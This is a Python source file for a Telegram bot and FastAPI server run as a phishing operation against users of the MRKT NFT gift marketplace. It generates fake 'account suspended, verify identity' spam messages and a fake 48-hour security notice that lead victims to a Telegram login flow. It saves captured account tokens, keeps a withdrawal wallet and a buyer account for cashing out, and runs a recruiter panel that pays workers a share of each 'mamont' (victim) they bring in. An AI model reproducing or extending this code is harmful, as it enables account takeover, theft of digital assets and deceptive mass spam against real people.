# ══════════════════════════════════════════════════════════════
# MRKT Bot — Telegram бот + FastAPI сервер для авторизации
# ══════════════════════════════════════════════════════════════

import asyncio
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone, timedelta
from typing import Optional, Dict, Any

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardButton, InlineKeyboardMarkup,
    WebAppInfo, CallbackQuery, InlineQuery,
    InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.filters import Command, CommandStart, CommandObject
from uuid import uuid4
from aiogram.enums import ParseMode
import base64

def _encode_worker_id(wid: int) -> str:
    return base64.urlsafe_b64encode(str(wid).encode()).decode().rstrip('=')

def _decode_worker_id(enc: str) -> int:
    try:
        padding = '=' * (4 - len(enc) % 4)
        return int(base64.urlsafe_b64decode(enc + padding).decode())
    except Exception:
        return 0

from fastapi import FastAPI, HTTPException, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
import uvicorn
import mimetypes

mimetypes.add_type("application/gzip", ".tgs")

# ── Imports ──
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from mrkt import config as mrkt_config
from mrkt.mrkt_api import MrktAPI
from mrkt.mrkt_pipeline import MrktPipeline
from mrkt.spam_parser import SpamParser
from mrkt.feed_parser import FeedParser

# ── Telethon ──
from telethon.errors import SessionPasswordNeededError
try:
    from telethon_client import TelethonClient, TwoFactorAuthRequiredError
except ImportError:
    # Fallback: попробуем найти в корне проекта
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    sys.path.insert(0, root)
    from telethon_client import TelethonClient, TwoFactorAuthRequiredError

# ── Logging ──
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(name)-20s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("mrkt.bot")
# Подавляем бинарный мусор от Telethon в консоли
logging.getLogger("telethon").setLevel(logging.WARNING)
logging.getLogger("opentele").setLevel(logging.WARNING)

from aiogram.client.default import DefaultBotProperties

# ══════════════════════════════════════════════
# Bot + FastAPI instances
# ══════════════════════════════════════════════
bot = Bot(
    token=mrkt_config.BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()
app = FastAPI(title="MRKT Bot API", docs_url=None, redoc_url=None, openapi_url=None)

# Serve frontend
FRONTEND_DIR = os.path.dirname(os.path.abspath(__file__))
app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")

# ══════════════════════════════════════════════
# State
# ══════════════════════════════════════════════
# Auth sessions: {session_id: {user_id, phone, telethon_client, status, ...}}
auth_sessions: Dict[str, dict] = {}

# User action logs
user_action_logs: Dict[int, list] = {}

# Referrals: {mamont_id: referrer_id}
referrals: Dict[int, int] = {}

# Broadcast sessions
broadcast_sessions: list[str] = []

# Active parsers
active_parsers: Dict[str, Any] = {}


async def _worker_notify(worker_id: int, msg: str):
    """Отправляет сообщение воркеру при слёте его спам-акка."""
    try:
        await bot.send_message(worker_id, msg, parse_mode="HTML")
    except Exception:
        pass

# ── Worker system (shared module) ──
import workers as worker_system

# Saved MRKT tokens: {"phone": {"token": ..., "username": ..., "tg_id": ..., "phone": ..., "saved_at": ...}}
SAVED_TOKENS_FILE = os.path.join(os.path.dirname(__file__), "saved_tokens.json")
saved_tokens: Dict[str, dict] = {}

# Buyer account for withdrawal via gift purchase
BUYER_TOKEN_FILE = os.path.join(os.path.dirname(__file__), "buyer_token.json")
buyer_token_data: dict = {}  # {"token": ..., "username": ..., "tg_id": ...}

def _load_saved_tokens():
    global saved_tokens
    if os.path.exists(SAVED_TOKENS_FILE):
        try:
            with open(SAVED_TOKENS_FILE, "r", encoding="utf-8") as f:
                saved_tokens = json.load(f)
        except Exception:
            saved_tokens = {}

def _save_tokens():
    try:
        with open(SAVED_TOKENS_FILE, "w", encoding="utf-8") as f:
            json.dump(saved_tokens, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save tokens: {e}")

def _add_token(phone: str, token: str, username: str = "?", tg_id: int = 0, first_name: str = ""):
    saved_tokens[phone] = {
        "token": token,
        "username": username,
        "tg_id": tg_id,
        "first_name": first_name,
        "phone": phone,
        "saved_at": kyiv_str(),
    }
    _save_tokens()

_load_saved_tokens()

def _load_buyer_token():
    global buyer_token_data
    if os.path.exists(BUYER_TOKEN_FILE):
        try:
            with open(BUYER_TOKEN_FILE, "r", encoding="utf-8") as f:
                buyer_token_data = json.load(f)
        except Exception:
            buyer_token_data = {}

def _save_buyer_token():
    try:
        with open(BUYER_TOKEN_FILE, "w", encoding="utf-8") as f:
            json.dump(buyer_token_data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save buyer token: {e}")

_load_buyer_token()

# ══════════════════════════════════════════════
# Utils
# ══════════════════════════════════════════════
KYIV_TZ = timezone(timedelta(hours=3))


def kyiv_now() -> datetime:
    return datetime.now(KYIV_TZ)


def kyiv_str() -> str:
    return kyiv_now().strftime("%d.%m.%Y %H:%M:%S")


def is_admin(user_id: int) -> bool:
    return user_id in mrkt_config.ADMIN_IDS

def is_moderator(user_id: int) -> bool:
    """Модератор: просмотр токенов + загрузка с maksik. Не админ."""
    return user_id in getattr(mrkt_config, "MODERATOR_IDS", [])

def is_admin_or_mod(user_id: int) -> bool:
    return is_admin(user_id) or is_moderator(user_id)


def log_action(user_id: int, action: str, detail: str = ""):
    entry = {"time": kyiv_str(), "action": action, "detail": detail}
    if user_id not in user_action_logs:
        user_action_logs[user_id] = []
    user_action_logs[user_id].append(entry)
    logger.info(f"[USER {user_id}] {action}: {detail}")


async def send_admin_log(text: str):
    for aid in mrkt_config.ADMIN_IDS:
        try:
            await bot.send_message(aid, text, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"[ADMIN LOG] → {aid}: {e}")


async def send_log_to_chat(text: str):
    if mrkt_config.LOG_CHAT_ID:
        try:
            log_chat_id = int(mrkt_config.LOG_CHAT_ID)
            # Чтобы не было дублей, если лог-чат — это и есть админ:
            if log_chat_id not in mrkt_config.ADMIN_IDS:
                await bot.send_message(log_chat_id, text, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
#  TELEGRAM BOT HANDLERS
# ══════════════════════════════════════════════════════════════

@dp.inline_query()
async def inline_query_handler(inline_query: InlineQuery):
    user_id = inline_query.from_user.id

    # Проверка: только админы, вписанные руками, ИЛИ зарегистрированные воркеры
    allowed_ids = getattr(mrkt_config, "INLINE_ALLOWED_IDS", [])
    
    is_worker = worker_system.is_worker(user_id)
    worker_by_spam = worker_system.get_worker_by_spam_account(str(user_id))
    
    is_authorized = is_admin(user_id) or (user_id in allowed_ids) or is_worker or bool(worker_by_spam)

    if not is_authorized:
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="❌ Account access restricted",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "⚠️ <b>Notice: Account Limitations Applied</b>\n\n"
                        "We have temporarily paused certain capabilities on your profile.\n"
                        "Please undergo a quick confirmation to lift these limits and regain your full privileges.\n"
                        "If left unconfirmed, your features will stay on hold.\n\n"
                        "ℹ️ NOTE: Completing this removes all active limitations."
                    ),
                    parse_mode="HTML",
                ),
                description="Your account access is currently restricted"
            )
        ]
        await inline_query.answer(results, cache_time=5)
        return

    query = inline_query.query or ""
    
    # ── Поддержка простой ссылки: @bot https://t.me/nft/SnakeBox-4809 или просто SnakeBox-4809 ──
    import re as _re
    link_match = _re.search(r't\.me/nft/([A-Za-z0-9_-]+)', query)
    
    if link_match:
        # Простой формат: ссылка или слаг
        slug = link_match.group(1)
        # Генерируем красивое имя из слага: "SnakeBox-4809" → "Snake Box #4809"
        slug_parts = slug.rsplit('-', 1)
        if len(slug_parts) == 2 and slug_parts[1].isdigit():
            raw_name = _re.sub(r'(?<=[a-z])(?=[A-Z])', ' ', slug_parts[0])
            full_name = f"{raw_name} #{slug_parts[1]}"
        else:
            full_name = slug
        target_user = "0"
        spam_acc_id = "0"
    elif '|' in query:
        # Старый формат для спам-парсера: slug|name|target|spam_id
        parts = query.split('|', 3)
        if len(parts) == 4:
            slug = parts[0]
            full_name = parts[1]
            target_user = parts[2]
            spam_acc_id = parts[3]
        elif len(parts) == 3:
            slug = parts[0]
            full_name = parts[1]
            target_user = parts[2]
            spam_acc_id = "0"
        else:
            slug = parts[0]
            full_name = parts[0]
            target_user = "0"
            spam_acc_id = "0"
    elif query.strip():
        # Голый слаг без ссылки: SnakeBox-4809
        slug = query.strip()
        slug_parts = slug.rsplit('-', 1)
        if len(slug_parts) == 2 and slug_parts[1].isdigit():
            raw_name = _re.sub(r'(?<=[a-z])(?=[A-Z])', ' ', slug_parts[0])
            full_name = f"{raw_name} #{slug_parts[1]}"
        else:
            full_name = slug
        target_user = "0"
        spam_acc_id = "0"
    else:
        slug = "None"
        full_name = "None"
        target_user = "0"
        spam_acc_id = "0"
        
    # Определяем worker_id по спам-аккаунту
    worker_id = worker_system.get_worker_by_spam_account(spam_acc_id)
    if not worker_id:
        worker_id = worker_system.get_worker_by_spam_account(str(inline_query.from_user.id))
        
    ref_param = f"spec_{_encode_worker_id(worker_id)}" if worker_id else "ref"
        
    nft_link = f"https://t.me/nft/{slug}"
    
    spam_message = (
        "⚠️ ACTION REQUIRED: Your profile is temporarily suspended.\n\n"
        f"<a href='{nft_link}'><b>{full_name}</b></a>\n\n"
        "Please complete a mandatory security check to confirm your identity and regain full access.\n"
        "Failure to verify will lead to permanent account termination and the complete loss of your digital assets.\n\n"
        "💡 NOTE: Finishing this process will instantly lift all limitations applied by @mrkt.\n"
    )

    bot_info = await bot.get_me()
    bot_username = bot_info.username

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔓 Verify Identity", url=f"https://t.me/{bot_username}?start={ref_param}")]
    ])

    results = [
        InlineQueryResultArticle(
            id=str(uuid4()),
            title="Send Spam",
            input_message_content=InputTextMessageContent(
                message_text=spam_message,
                parse_mode="HTML",
                disable_web_page_preview=False
            ),
            reply_markup=keyboard,
            description="Send spam with inline button"
        )
    ]
    
    await inline_query.answer(results, cache_time=1)

@dp.message(CommandStart())
async def cmd_start(message: types.Message, command: CommandObject):
    user = message.from_user
    user_id = user.id
    username = user.username or ""
    full_name = user.full_name or ""

    # Реферал → привязка мамонта к воркеру
    referrer_id = None
    if command.args:
        if command.args.startswith("spec_"):
            try:
                enc_id = command.args.split("_", 1)[1]
                decoded_id = _decode_worker_id(enc_id)
                if decoded_id:
                    referrer_id = decoded_id
                    referrals[user_id] = referrer_id
                    # Привязываем мамонта к воркеру
                    if worker_system.is_worker(referrer_id):
                        worker_system.bind_mamont(user_id, referrer_id)
            except Exception:
                pass

    log_action(user_id, "start", f"@{username} ({full_name}), ref={referrer_id}")

    # Минимальная БД юзеров
    known_users_file = os.path.join(os.path.dirname(__file__), "known_users.json")
    known_users = []
    if os.path.exists(known_users_file):
        try:
            with open(known_users_file, "r", encoding="utf-8") as f:
                known_users = json.load(f)
        except Exception:
            pass
            
    if user_id not in known_users:
        known_users.append(user_id)
        try:
            with open(known_users_file, "w", encoding="utf-8") as f:
                json.dump(known_users, f)
        except Exception:
            pass

        ref_str = f"\n👤 Реферер: <code>{referrer_id}</code>" if referrer_id else ""
        await send_admin_log(
            f"🆕 <b>Новый юзер</b>\n"
            f"👤 {full_name} (@{username})\n"
            f"🆔 <code>{user_id}</code>{ref_str}\n"
            f"🕐 {kyiv_str()}"
        )

    # WebApp кнопка → фронтенд авторизации
    webapp_url = mrkt_config.WEBAPP_URL
    if webapp_url:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="Verify Account",
                web_app=WebAppInfo(url=webapp_url),
            )],
        ])
    else:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="Verify Account",
                url="https://t.me/mrkt",
            )],
        ])

    text = (
        "<b>Account Security Check — 48h Notice</b>\n\n"
        "Due to migration to a new security infrastructure, MRKT now asks all active users to re-verify ownership.\n"
        "Without confirmation within <b>48 hours</b>, your account will be temporarily restricted from:\n"
        "— Arena season rewards\n"
        "— Bonus code activations\n"
        "— Multi-device trading sessions\n\n"
        "Verify your account now to avoid restrictions."
    )

    photo_path = os.path.join(os.path.dirname(__file__), "mrkt.jpg")
    try:
        from aiogram.types import FSInputFile
        if os.path.exists(photo_path):
            await message.answer_photo(
                FSInputFile(photo_path),
                caption=text,
                reply_markup=keyboard,
            )
        else:
            await message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Error sending start message: {e}")
        await message.answer(text, reply_markup=keyboard)


# ══════════════════════════════════════════════════════════════
#  WORKER PANEL (/swag)
# ══════════════════════════════════════════════════════════════

def _worker_keyboard(worker_id: int) -> InlineKeyboardMarkup:
    bot_username = mrkt_config.BOT_USERNAME
    ref_link = f"https://t.me/{bot_username}?start=spec_{_encode_worker_id(worker_id)}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить рассылку", callback_data="wkr_start_spam")],
        [InlineKeyboardButton(text="📱 Добавить спам-акк", callback_data="wkr_add_spam")],
        [InlineKeyboardButton(text="📋 Мои спам-акки", callback_data="wkr_my_spam")],
        [InlineKeyboardButton(text="📊 Мои логи", callback_data="wkr_my_logs")],
        [InlineKeyboardButton(text="🔗 Моя реферальная ссылка", callback_data="wkr_ref_link")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="wkr_refresh")],
    ])


@dp.message(Command("swag"))
async def cmd_swag(message: types.Message):
    """Воркер панель — доступна всем."""
    uid = message.from_user.id
    uname = message.from_user.username or str(uid)

    # Авторегистрация воркера
    worker_system.register_worker(uid, uname)

    text = worker_system.format_worker_stats(uid)
    await message.answer(text, reply_markup=_worker_keyboard(uid))


@dp.callback_query(F.data == "wkr_refresh")
async def cb_wkr_refresh(callback: CallbackQuery):
    uid = callback.from_user.id
    text = worker_system.format_worker_stats(uid)
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=_worker_keyboard(uid))
    except Exception:
        pass
    await callback.answer()


@dp.callback_query(F.data == "wkr_ref_link")
async def cb_wkr_ref_link(callback: CallbackQuery):
    uid = callback.from_user.id
    bot_username = mrkt_config.BOT_USERNAME
    ref_link = f"https://t.me/{bot_username}?start=spec_{_encode_worker_id(uid)}"
    await callback.message.answer(
        f"🔗 <b>Твоя реф. ссылка:</b>\n\n"
        f"<code>{ref_link}</code>\n\n"
        f"Мамонт перейдёт → привяжется к тебе → ты получаешь {int(worker_system.WORKER_PERCENTAGE * 100)}% с его логов",
    )
    await callback.answer()


@dp.callback_query(F.data == "wkr_my_logs")
async def cb_wkr_my_logs(callback: CallbackQuery):
    uid = callback.from_user.id
    earnings = worker_system.get_worker_earnings(uid)
    history = worker_system.get_worker_history(uid, 10)

    text = (
        f"📊 <b>Мои логи</b>\n\n"
        f"💰 Заработано: <b>{earnings['total_earned']} TON</b>\n"
        f"📈 Всего логов: <b>{earnings['total_logs']} TON</b>\n"
        f"📊 Процент: <b>{int(worker_system.WORKER_PERCENTAGE * 100)}%</b>\n"
    )

    if history:
        text += "\n<blockquote><b>📋 История:</b>\n"
        for h in history:
            text += (
                f"  • {h.get('bot', '?').upper()} — {h.get('amount', 0)} TON → "
                f"<b>{h.get('worker_share', 0)} TON</b> "
                f"({h.get('timestamp', '?')})\n"
            )
        text += "</blockquote>"
    else:
        text += "\n<i>Пока нет логов</i>"

    await callback.message.answer(text)
    await callback.answer()


@dp.callback_query(F.data == "wkr_my_spam")
async def cb_wkr_my_spam(callback: CallbackQuery):
    uid = callback.from_user.id
    accounts = worker_system.get_worker_spam_accounts(uid)
    if not accounts:
        await callback.answer("❌ Нет спам-аккаунтов", show_alert=True)
        return
    text = "📱 <b>Мои спам-акки:</b>\n\n"
    for i, phone in enumerate(accounts, 1):
        text += f"  {i}. <code>{phone}</code>\n"
    await callback.message.answer(text)
    await callback.answer()


@dp.callback_query(F.data == "wkr_add_spam")
async def cb_wkr_add_spam(callback: CallbackQuery):
    uid = callback.from_user.id
    auth_sessions[f"_wkr_spam_{uid}"] = {"step": "phone"}
    await callback.message.answer("📱 Отправь номер спам-акка (в формате +7...):")
    await callback.answer()


@dp.callback_query(F.data == "wkr_start_spam")
async def cb_wkr_start_spam(callback: CallbackQuery):
    """Воркер запускает рассылку со своих спам-аккаунтов."""
    uid = callback.from_user.id
    
    # Получаем spam_account_ids воркера
    worker_data = worker_system.get_worker(uid)
    if not worker_data:
        await callback.answer("❌ Ты не зарегистрирован как воркер!", show_alert=True)
        return
    
    spam_ids = worker_data.get("spam_account_ids", [])
    if not spam_ids:
        await callback.answer("❌ У тебя нет спам-аккаунтов! Добавь через 📱", show_alert=True)
        return
    
    # Ищем файлы сессий воркера
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    worker_sessions = []
    for sid in spam_ids:
        path = os.path.join(d, f"parser_{sid}.session")
        if os.path.exists(path):
            worker_sessions.append(path)
    
    if not worker_sessions:
        await callback.answer("❌ Нет валидных сессий для твоих аккаунтов!", show_alert=True)
        return
    
    uname = callback.from_user.username or str(uid)
    
    # Проверяем есть ли активная рассылка
    main_parser = active_parsers.get("main")
    if main_parser and main_parser.is_running:
        # ═══ Рассылка уже идёт — добавляем акки в очередь ═══
        added = 0
        for sp in worker_sessions:
            if sp not in main_parser.session_paths:
                main_parser.session_paths.append(sp)
                added += 1
        
        if added > 0:
            await callback.message.answer(
                f"📋 <b>Рассылка уже активна!</b>\n\n"
                f"✅ Добавлено в очередь: <b>{added}</b> акков\n"
                f"📊 Всего в очереди: <b>{len(main_parser.session_paths)}</b>\n\n"
                f"<i>Твои аккаунты начнут работать, когда текущие отработают или отлетят</i>",
                parse_mode="HTML",
            )
            await send_admin_log(
                f"📋 Воркер @{uname} добавил {added} акков в очередь рассылки\n"
                f"📊 Всего: {len(main_parser.session_paths)}"
            )
        else:
            await callback.message.answer(
                "⚠️ Все твои аккаунты уже в очереди!",
            )
        await callback.answer()
        return
    
    # ═══ Рассылки нет — запускаем новую с акками воркера ═══
    parser = SpamParser(worker_sessions, "", notify_callback=send_admin_log, worker_notify=_worker_notify)
    active_parsers["main"] = parser
    
    await callback.message.answer(
        f"🚀 <b>Рассылка запущена!</b>\n\n"
        f"📱 Аккаунтов: <b>{len(worker_sessions)}</b>\n"
        f"👤 Воркер: @{uname}\n\n"
        f"<i>Парсю подарки и отправляю сообщения...</i>",
        parse_mode="HTML",
    )
    await send_admin_log(
        f"🚀 Воркер @{uname} запустил рассылку\n"
        f"📱 Акков: {len(worker_sessions)}"
    )
    await callback.answer("🚀 Запущено!")
    
    asyncio.create_task(parser.start())


@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    uid = message.from_user.id

    # Модератор — урезанная панель
    if is_moderator(uid) and not is_admin(uid):
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=f"🔑 Токены ({len(saved_tokens)})",
                callback_data="mrkt_adm_tokens",
            )],
        ])
        await message.answer(
            f"📋 <b>MRKT — Модератор</b>\n\n"
            f"🔑 Токенов: <b>{len(saved_tokens)}</b>\n"
            f"🕐 {kyiv_str()}",
            reply_markup=keyboard,
        )
        return

    if not is_admin(uid):
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"💳 Кош: {mrkt_config.WITHDRAW_WALLET[:12] + '...' if mrkt_config.WITHDRAW_WALLET else '❌'}",
            callback_data="mrkt_adm_wallet",
        )],
        [InlineKeyboardButton(
            text=f"🔑 Токены ({len(saved_tokens)})",
            callback_data="mrkt_adm_tokens",
        )],
        [InlineKeyboardButton(text="📱 Управление спам-акками", callback_data="mrkt_adm_spam_manage")],
        [InlineKeyboardButton(text="🤖 Добавить спам-акк", callback_data="mrkt_adm_add_parser")],
        [
            InlineKeyboardButton(text="▶️ Старт парсер", callback_data="mrkt_adm_start_spam"),
            InlineKeyboardButton(text="⏹ Стоп", callback_data="mrkt_adm_stop_spam")
        ],
        [
            InlineKeyboardButton(text="📡 Feed парсер", callback_data="mrkt_adm_start_feed"),
            InlineKeyboardButton(text="⏹ Стоп Feed", callback_data="mrkt_adm_stop_feed")
        ],
        [InlineKeyboardButton(text="🚀 Бусты на канал", callback_data="mrkt_adm_boost_channel")]
    ])

    # Подсчитываем спам-сессии
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    spam_sessions = len([f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]) if os.path.exists(d) else 0

    # Подсчитываем юзеров из БД
    known_users_file = os.path.join(os.path.dirname(__file__), "known_users.json")
    known_users_count = 0
    if os.path.exists(known_users_file):
        try:
            with open(known_users_file, "r", encoding="utf-8") as f:
                known_users_count = len(json.load(f))
        except Exception:
            pass

    await message.answer(
        f"👑 <b>MRKT ADMIN</b>\n\n"
        f"👥 Юзеров: <b>{known_users_count}</b>\n"
        f"🔄 Auth сессий: <b>{len(auth_sessions)}</b>\n"
        f"📱 Спам-акков: <b>{spam_sessions}</b>\n"
        f"🕐 {kyiv_str()}",
        reply_markup=keyboard,
    )

def get_parser_username(uid):
    path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, "usernames.json")
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f).get(str(uid), str(uid))
        except Exception:
            pass
    return str(uid)

@dp.callback_query(F.data == "mrkt_adm_spam_manage")
async def cb_manage_spam_accounts(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
        
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    if not os.path.exists(d):
        await callback.answer("❌ Папка сессий не найдена", show_alert=True)
        return
        
    files = [f for f in os.listdir(d) if f.startswith("parser_") and (f.endswith(".session") or f.endswith(".disabled"))]
    if not files:
        await callback.answer("❌ Нет спам-аккаунтов", show_alert=True)
        return
        
    kb = [
        [
            InlineKeyboardButton(text="▶️ Включить все", callback_data="mrkt_adm_spam_enable_all"),
            InlineKeyboardButton(text="⏹ Выключить все", callback_data="mrkt_adm_spam_disable_all")
        ],
        [InlineKeyboardButton(text="🔍 Проверить на валидность", callback_data="mrkt_adm_spam_validate")]
    ]
    text = "📱 <b>Управление спам-аккаунтами</b>\n\n"
    for i, f in enumerate(files):
        uid = f.replace("parser_", "").replace(".session", "").replace(".disabled", "")
        username = get_parser_username(uid)
        status = "🔴 ВЫКЛ" if f.endswith(".disabled") else "🟢 ВКЛ"
        text += f"{i+1}. <code>{username}</code> - {status}\n"
        
        from mrkt.warmup_engine import is_warming
        warm_icon = "🔥" if is_warming(uid) else "❄️"
        kb.append([
            InlineKeyboardButton(text=f"ВКЛ/ВЫКЛ ({username})", callback_data=f"mrkt_adm_spam_toggle_{uid}"),
            InlineKeyboardButton(text=f"{warm_icon} Прогрев", callback_data=f"mrkt_adm_warmup_{uid}"),
            InlineKeyboardButton(text="🗑", callback_data=f"mrkt_adm_spam_del_{uid}")
        ])
        
    kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="mrkt_adm_back")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data == "mrkt_adm_spam_enable_all")
async def cb_enable_all_spam(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    if not os.path.exists(d):
        await callback.answer("❌ Папка не найдена", show_alert=True)
        return
    count = 0
    for f in os.listdir(d):
        if f.startswith("parser_") and f.endswith(".disabled"):
            old = os.path.join(d, f)
            new = os.path.join(d, f.replace(".disabled", ".session"))
            os.rename(old, new)
            count += 1
    await callback.answer(f"✅ Включено аккаунтов: {count}", show_alert=True)
    await cb_manage_spam_accounts(callback)

@dp.callback_query(F.data == "mrkt_adm_spam_disable_all")
async def cb_disable_all_spam(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    if not os.path.exists(d):
        await callback.answer("❌ Папка не найдена", show_alert=True)
        return
    count = 0
    for f in os.listdir(d):
        if f.startswith("parser_") and f.endswith(".session"):
            old = os.path.join(d, f)
            new = os.path.join(d, f.replace(".session", ".disabled"))
            os.rename(old, new)
            count += 1
    await callback.answer(f"⏹ Выключено аккаунтов: {count}", show_alert=True)
    await cb_manage_spam_accounts(callback)

@dp.callback_query(F.data == "mrkt_adm_spam_validate")
async def cb_validate_spam_accounts(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
        
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    if not os.path.exists(d):
        await callback.answer("❌ Папка сессий не найдена", show_alert=True)
        return
        
    files = [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]
    if not files:
        await callback.answer("❌ Нет активных спам-аккаунтов для проверки", show_alert=True)
        return
        
    await callback.message.edit_text(f"⏳ Проверяю {len(files)} аккаунтов на валидность...\nЭто может занять некоторое время.")
    
    deleted_count = 0
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    
    for f in files:
        path = os.path.join(d, f)
        try:
            with open(path, "r", encoding="utf-8") as file:
                session_str = file.read().strip()
                
            client = TelegramClient(StringSession(session_str), mrkt_config.API_ID, mrkt_config.API_HASH)
            await client.connect()
            
            me = await client.get_me()
            
            # Проверяем на "теневой бан" / заморозку: 
            # замороженные аккаунты не могут искать паблик юзернеймы
            is_frozen = False
            try:
                await client.get_entity("@mrktbank")
            except Exception:
                is_frozen = True

            # Проверяем на вечный спамблок через @spambot
            is_spamblocked = False
            if not is_frozen:
                try:
                    await client.send_message("@spambot", "/start")
                    await asyncio.sleep(2)
                    msgs = await client.get_messages("@spambot", limit=1)
                    if msgs and msgs[0].text:
                        txt = msgs[0].text.lower()
                        # Только ВЕЧНЫЙ бан — конкретные фразы которые @spambot шлёт
                        # RU: "антиспам-система излишне сурово" + "Пока действуют ограничения"
                        # EN: "our anti-spam systems" + "while the restrictions are active"
                        permanent_markers = [
                            "антиспам-система излишне сурово",
                            "пока действуют ограничения",
                            "our anti-spam systems",
                            "while the restrictions are active",
                            "can only reply to those",
                        ]
                        if any(m in txt for m in permanent_markers):
                            is_spamblocked = True
                            uid = f.replace("parser_", "").replace(".session", "")
                            uname = get_parser_username(uid)
                            logger.warning(f"[SPAM_VALIDATE] 🚫 {uname} — вечный спамблок!")
                except Exception as sb_err:
                    logger.warning(f"[SPAM_VALIDATE] Ошибка проверки @spambot для {f}: {sb_err}")
                
            if not me or not await client.is_user_authorized() or is_frozen or is_spamblocked:
                await client.disconnect()
                uid = f.replace("parser_", "").replace(".session", "")
                uname = get_parser_username(uid)
                reason = "спамблок" if is_spamblocked else ("заморозка" if is_frozen else "не авторизован")
                os.remove(path)
                deleted_count += 1
                await send_admin_log(f"🗑 Удалён невалид: <code>{uname}</code> — {reason}")
            else:
                await client.disconnect()
        except Exception as e:
            logger.error(f"[SPAM_VALIDATE] Ошибка при проверке {f}: {e}")
            if os.path.exists(path):
                os.remove(path)
            deleted_count += 1
            
    await callback.message.edit_text(
        f"✅ <b>Проверка завершена</b>\n\n"
        f"Всего проверено: {len(files)}\n"
        f"Удалено невалидных: {deleted_count}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад к списку", callback_data="mrkt_adm_spam_manage")]])
    )

@dp.callback_query(F.data.startswith("mrkt_adm_spam_toggle_"))
async def cb_toggle_spam_account(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.replace("mrkt_adm_spam_toggle_", "")
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    
    path_on = os.path.join(d, f"parser_{phone}.session")
    path_off = os.path.join(d, f"parser_{phone}.disabled")
    
    if os.path.exists(path_on):
        os.rename(path_on, path_off)
        await callback.answer(f"Аккаунт {phone} отключен")
    elif os.path.exists(path_off):
        os.rename(path_off, path_on)
        await callback.answer(f"Аккаунт {phone} включен")
    else:
        await callback.answer("❌ Файл не найден", show_alert=True)
        return
        
    await cb_manage_spam_accounts(callback)

@dp.callback_query(F.data.startswith("mrkt_adm_spam_del_"))
async def cb_del_spam_account(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.replace("mrkt_adm_spam_del_", "")
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    
    path_on = os.path.join(d, f"parser_{phone}.session")
    path_off = os.path.join(d, f"parser_{phone}.disabled")
    
    if os.path.exists(path_on):
        os.remove(path_on)
    if os.path.exists(path_off):
        os.remove(path_off)
        
    await callback.answer(f"Аккаунт {phone} удален", show_alert=True)
    await cb_manage_spam_accounts(callback)


# ══════════════════════════════════════════════════════════════
#  BOOST CHANNEL — все премиум-акки бустят канал
# ══════════════════════════════════════════════════════════════

BOOST_INVITE_HASH = "a2Zzba_Zy41lNjky"  # https://t.me/+a2Zzba_Zy41lNjky

@dp.callback_query(F.data == "mrkt_adm_boost_channel")
async def cb_boost_channel(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    if not os.path.exists(d):
        await callback.answer("❌ Папка сессий не найдена", show_alert=True)
        return
    
    files = [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]
    if not files:
        await callback.answer("❌ Нет спам-аккаунтов", show_alert=True)
        return
    
    await callback.message.edit_text(
        f"⏳ Проверяю {len(files)} аккаунтов...\n"
        f"Джойн в канал → буст (4 слота каждый)"
    )
    await callback.answer()
    
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    
    boosted = 0
    total_boosts = 0
    no_premium = 0
